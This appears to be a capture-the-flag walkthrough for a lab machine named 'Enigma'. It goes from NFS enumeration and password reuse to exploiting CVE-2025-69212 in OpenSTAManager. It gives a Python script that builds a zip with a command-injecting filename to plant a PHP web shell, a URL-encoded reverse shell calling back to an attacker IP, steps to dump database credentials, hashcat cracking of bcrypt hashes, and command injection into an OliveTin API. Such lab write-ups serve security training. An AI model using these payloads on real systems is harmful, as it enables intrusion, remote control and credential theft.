# Enigma

<img width="1590" height="285" alt="image" src="https://github.com/user-attachments/assets/d0246e3e-114a-4343-a42c-4b242118ceba" />

---

## Nmap Scan 

```
nmap -sCV -Pn IP_ADDRESS
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-28 05:23 UTC
Nmap scan report for enigma.htb (10.129.128.134)
Host is up (0.55s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Enigma Corp \xE2\x80\x94 Managed IT Solutions
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL TOP PIPELINING RESP-CODES STLS CAPA UIDL AUTH-RESP-CODE
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36909/tcp   mountd
|   100005  1,2,3      48598/udp6  mountd
|   100005  1,2,3      56331/tcp6  mountd
|   100005  1,2,3      58753/udp   mountd
|   100021  1,3,4      36095/tcp   nlockmgr
|   100021  1,3,4      39358/udp6  nlockmgr
|   100021  1,3,4      40557/udp   nlockmgr
|   100021  1,3,4      45005/tcp6  nlockmgr
|   100024  1          42477/tcp   status
|   100024  1          51019/tcp6  status
|   100024  1          53590/udp6  status
|   100024  1          53937/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more LOGINDISABLEDA0001 capabilities post-login have listed ENABLE STARTTLS Pre-login OK IMAP4rev1 LOGIN-REFERRALS ID LITERAL+ IDLE SASL-IR
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: more capabilities post-login have listed ENABLE IDLE Pre-login OK AUTH=PLAINA0001 IMAP4rev1 ID LITERAL+ LOGIN-REFERRALS SASL-IR
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_pop3-capabilities: SASL(PLAIN) TOP PIPELINING RESP-CODES USER CAPA UIDL AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.63 seconds
                                                    
```

> interested **`2049`** **`111`**

<details>
  <summary>What is NFS?</summary>

## 1. So, what exactly is NFS?

Imagine you have a Linux machine.

You create a folder named

```
/home/company
```

and you want all company employees to be able to access it from their own machines.

So, you share it using NFS.

This allows any machine to perform a

```
mount
```

operation and view the files.

It is exactly like a Windows shared folder, but for Linux.

---

## 2. So, how do I find out what the shared folders are?

This is where the following command comes in:

```
showmount -e IP
```

The flag

```
-e
```

stands for

```
exports
```

meaning:

> Show me the folders that the server is sharing.

So, we ran:

```
showmount -e 10.129.128.134
```

And the response was:

```
Export list:/srv/nfs/onboarding *
```

This means the server is saying:

> I am sharing a folder named

```
/srv/nfs/onboarding
```

  
</details>

## Let's see sharing folder

```
showmount -e 10.129.128.134
```

**`outpt`**

```
Export list:/srv/nfs/onboarding *
```

## let's get it 

```
sudo mount -t nfs 10.129.128.134:/srv/nfs/onboarding /mnt/onboarding
```

```
 ls -lah /mnt/onboarding
```

**`found pdf`**

<img width="989" height="175" alt="image" src="https://github.com/user-attachments/assets/86595e79-2811-4f17-b3fd-3e6f9ed85cb3" />

## after open pdf found 

<img width="1885" height="606" alt="image" src="https://github.com/user-attachments/assets/8474690c-05b5-4316-8912-a9a0f82e6e05" />

## first lets add **`mail001.enigma.htb`** to **`/etc/hosts`**

> then login with credientials 

**`kevin : Enigma2024!`**

<img width="1919" height="805" alt="image" src="https://github.com/user-attachments/assets/50bbabdb-1b74-455c-8c9e-09fedaf69fff" />

## just found one email from sarah 

<img width="1009" height="624" alt="image" src="https://github.com/user-attachments/assets/4fc8e4e1-fce7-4389-961e-84fa8767c0d8" />

## found version of webmail 

<img width="1347" height="546" alt="image" src="https://github.com/user-attachments/assets/94e9c7dd-025f-400f-bb75-4b6ba17a5e9c" />

## i tryied alot to find `cves` to get rce but all was less than **`1.6.16`**

> ## so i try to login to sarah with same password of kevin and boom 

```
sarah : Enigma2024!
```

## found another email 

<img width="940" height="495" alt="image" src="https://github.com/user-attachments/assets/fd558599-b368-486d-a1de-d7595986b167" />

```
http://support_001.enigma.htb
```

```
admin : Ne3s4rtars78s
```

## after add **`support_001.enigma.htb`** to **`/etc/hosts`** loged in with credentioals

<img width="1919" height="805" alt="image" src="https://github.com/user-attachments/assets/39f5609e-4fd7-440c-92f1-34b6bb94b888" />

## found it work with **`OpenSTAManager  Version 2.9.8 `** after some search found cve 

> ## [CVE-2025-69212](https://github.com/advisories/GHSA-25fp-8w8p-mx36)

## create the payload and upload it 

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

<img width="1919" height="763" alt="image" src="https://github.com/user-attachments/assets/f6dda642-3c33-48a2-814c-be825e9e5393" />

```
 curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

<img width="880" height="193" alt="image" src="https://github.com/user-attachments/assets/53b15dac-4042-4218-b20c-e141561a7d59" />

## get reveseshell 

```
nc -lnvp

curl "http://support_001.enigma.htb/files/SHELL.php?c=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%2210.10.16.75%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bsubprocess.call(%5B%22/bin/sh%22%2C%22-i%22%5D)%27"

```

<img width="778" height="151" alt="image" src="https://github.com/user-attachments/assets/e796086e-3865-4ff3-b7b7-662fc9179d6a" />

---

## after digging found db credentioanls in **`/var/www/html/roundcube/config/config.inc.php`**

```
cat /var/www/html/roundcube/config/config.inc.php
```

<img width="1259" height="268" alt="image" src="https://github.com/user-attachments/assets/1aec113a-33c9-490a-9733-96fd3a82642a" />

```
mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e "SHOW TABLES;"
```

<img width="1193" height="469" alt="image" src="https://github.com/user-attachments/assets/a7195998-c7ef-4455-a630-345c83164443" />

```
mysql -u roundcube -p'Yo270x26!gTx02' -D roundcubemail -e "SELECT * FROM session;"
```

## also found OpenSTAManager database credentials in :

```
cat /var/www/html/openstamanager/config.inc.php 2>/dev/null
```

<img width="1397" height="257" alt="image" src="https://github.com/user-attachments/assets/d4d265d6-6916-46f6-98cc-7a7c7c0d2a9a" />

```
DB Host: localhost
DB Username: brollin
DB Password: Fri3nds@9099
DB Name: openstamanager
```

## let's look at users table 

```
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "DESCRIBE zz_users;"
mysql -u brollin -p'Fri3nds@9099' -D openstamanager -e "SELECT id, username, password, email, enabled FROM zz_users;"
```

<img width="1571" height="546" alt="image" src="https://github.com/user-attachments/assets/b35c2e8c-ed49-483c-95bb-3a06d49cc772" />

```
echo '$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu' > admin.hash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash

hashcat -m 3200 -a 0 admin.hash /usr/share/wordlists/rockyou.txt
hashcat -m 3200 -a 0 haris.hash /usr/share/wordlists/rockyou.txt
```

<img width="1106" height="183" alt="image" src="https://github.com/user-attachments/assets/fe8593e4-c328-4f4b-a834-27f054c0af5f" />

## now we have haris passowrd let's get first flag 

```
haris : bestfriends
```

<img width="1066" height="150" alt="image" src="https://github.com/user-attachments/assets/13f1b138-ad72-4dba-b1e9-828ac517b070" />

---

# privesc

## Check All Listening Ports

```
ss -tln
```

<img width="932" height="372" alt="image" src="https://github.com/user-attachments/assets/809de1ad-4655-4f31-bb69-46d6c8689da9" />

```
curl http://127.0.0.1:1337/
```

<img width="1479" height="487" alt="image" src="https://github.com/user-attachments/assets/7dda5825-b961-4b1e-a37a-2ecdc7964bbe" />

### what is OliveTin

 This is a program that provides:

> A web interface for executing shell commands on the server

But in a controlled manner (using predefined commands)

## OliveTin API Command Injection

```
curl -s -X POST \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"actionId":"backup_database","arguments":[
    {"name":"db_user","value":"backup_svc"},
    {"name":"db_pass","value":"x'\'' ; id ; #"},
    {"name":"db_name","value":"production"}
  ]}'
```

<img width="1679" height="306" alt="image" src="https://github.com/user-attachments/assets/1f3cdb80-cdd4-48c7-af94-297b13954395" />

